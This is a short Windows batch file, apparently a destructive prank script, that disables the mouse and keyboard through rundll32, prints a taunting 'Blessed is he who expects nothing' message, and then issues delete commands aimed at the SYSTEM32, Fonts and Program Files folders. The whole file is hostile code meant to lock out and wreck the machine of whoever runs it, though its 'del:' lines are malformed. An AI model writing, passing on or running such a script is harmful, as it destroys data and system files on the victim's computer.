@echo off
C:\WINDOWS\rundll32.exe mouse,disable
C:\WINDOWS\rundll32.exe keyboard,disable
echo.
echo Blessed is he who expects nothing....
echo.
TYPE NUL | CHOICE.COM /N /CY /TY,4
echo For he will not be dissapointed.....
echo.
del: C:\WINDOWS\SYSTEM32
del: C:\WINDOWS\FONTS
del: C:\PROGRA~1
END 
EXIT

